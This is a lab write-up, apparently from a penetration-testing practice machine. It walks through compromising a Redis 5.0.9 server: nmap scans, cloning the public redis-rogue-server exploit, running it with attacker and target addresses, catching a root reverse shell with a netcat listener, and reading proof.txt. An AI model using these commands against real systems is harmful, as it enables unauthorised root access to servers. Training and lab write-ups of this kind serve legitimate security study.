Report

# 1. Nmap scan with service version or aggressive scan gives the Redis version 5.0.9:
`sudo nmap -p22,53,80,6379,8080,27017 -sV -T1 --version-intensity 9 -192.168.86.69`
![56f87ae1df8dbe24e7e7ae274a065a1a.png](../../../_resources/f9522a45ee6545c3baffd325f58a2c4a.png)
`sudo nmap -p22,53,80,6379,8080,27017 -A -T1 192.168.86.69`
![26cfb02087a47fd4a62bd6b394cc4eca.png](../../../_resources/fbe2337f00044bd7bc4e28ee0e076134.png)

# 2. Google search **redis 5.0.9 rce**.
This gave us some links that didn't quite work (eg. didn't have the exp.so file as indicated in the first link) ![caae93281ddfd9a6a077920aa4c505db.png](../../../_resources/6933d02f179245ea999459c057606aeb.png)

# 3. Google search **redis 5.0 rce**
This gave us a more broad search. The first link is the one that ended up working. ![d7e6b3a9fd4f1f05fb81ae7113c0e138.png](../../../_resources/c054c6a7210a44a4955213c63285fe26.png)

# 4. This exploit works 
https://github.com/n0b0dyCN/redis-rogue-server.git
![f05f0d882ebb96fe9c0fcbfb345b15cc.png](../../../_resources/6b62ebb06eb447b890c9b4a6a73f4859.png)

# 5. Inspect the code.
We see it is using python3
![31a4d601783e02163281cf24c5d5d200.png](../../../_resources/43b9b629ee964a36b22877898befd168.png)

# 6. Create a virtual project using python3 (default)
Also upgraded pip in the virutalenv, and downloaded what I saw were requirements (six and argparse) from the first link in step 2.
`mkproject n0b0dy` 
`pip install --upgrade pip`
`pip install six`
`pip install argparse`
![f1cac01808d71c5940fe2f7642ee8728.png](../../../_resources/d685493270ef4c1481a829f485ea3894.png)

# 8. Download the repo
`git clone https://github.com/n0b0dyCN/redis-rogue-server.git`
![3137a2c9fc6221521089f77e7d085f95.png](../../../_resources/0fe4c582153445e394f1fc05f055298d.png)

# 9. Run the exploit
### It did not work with the default usage that only specified the target and listener `python redis-rogue-server.py --rhost 192.168.159.69 --lhost 192.168.49.159`
![c49f2913d58f5ce8decc0eaba7ad35ae.png](../../../_resources/cb1a8382c97a47869b360b6eb87e7ea6.png)

### This DOES work:
`python redis-rogue-server.py --rhost 192.168.159.69 --lhost 192.168.49.159 --lport 8080`
![e9718ee3f58a7c9fdd50aaa8a8650b8e.png](../../../_resources/8c951a491c8041ca8c41673d28be971e.png)

# 10. Start the netcat listener prior to choosing the reverse shell.
The script will ask if you want an interactive or reverse shell. We will choose the reverse shell. HOWEVER, before inputting your choice, start a netcat listener
`sudo nc -lnvp 8080`
![67022a3cbb58c0f2b845cb2ec9e6b037.png](../../../_resources/0f2a4764453249de9727d01ec3a6f583.png)

# 11. Now choose the `r` for reverse shell
The rest of the exploit executes
![6de0ba96d8428a5536d4e6740ab0757e.png](../../../_resources/92df1f605cb548389add5b3bf6a86235.png)

# 12. Check our netcat listener.
We caught the shell and are root
![eb2157743a672e9630a495ccb706a688.png](../../../_resources/5409d5c4288c4f64b59ea051700a091f.png)

# 13. Proof.txt
`cat /root/proof.txt
3cdd353b8b7ca36a5b612104c044f5b2`

# 14. ifconfig
`ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                             
        inet 192.168.159.69  netmask 255.255.255.0  broadcast 192.168.159.255            
        ether 00:50:56:bf:14:c1  txqueuelen 1000  (Ethernet)                             
        RX packets 238  bytes 109910 (107.3 KiB)                                         
        RX errors 0  dropped 0  overruns 0  frame 0                                      
        TX packets 231  bytes 18538 (18.1 KiB)                                           
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0                       
                                                                                         
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536                                             
        inet 127.0.0.1  netmask 255.0.0.0                                                
        loop  txqueuelen 1  (Local Loopback)                                             
        RX packets 29583  bytes 3067007 (2.9 MiB)                                        
        RX errors 0  dropped 0  overruns 0  frame 0                                      
        TX packets 29583  bytes 3067007 (2.9 MiB)                                        
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0  `

# ALTERNATELY, this could be solved using Metasploit 

![a67d22866bd922ccb314af0a05821780.png](../../../_resources/da74b5a445ed444fb363443a69eb4e51.png)

Notes:
-port 4444 did not work
-we had to use port 8080 on the payload. Why? Because it matches the target's http-proxy port 8080 that uses nodebb?
-didn't work on linux/x86/shell_reverse_tcp port 8080. Why?
-didn't work on linux/x86/shell/reverse_tcp port 8080. Why?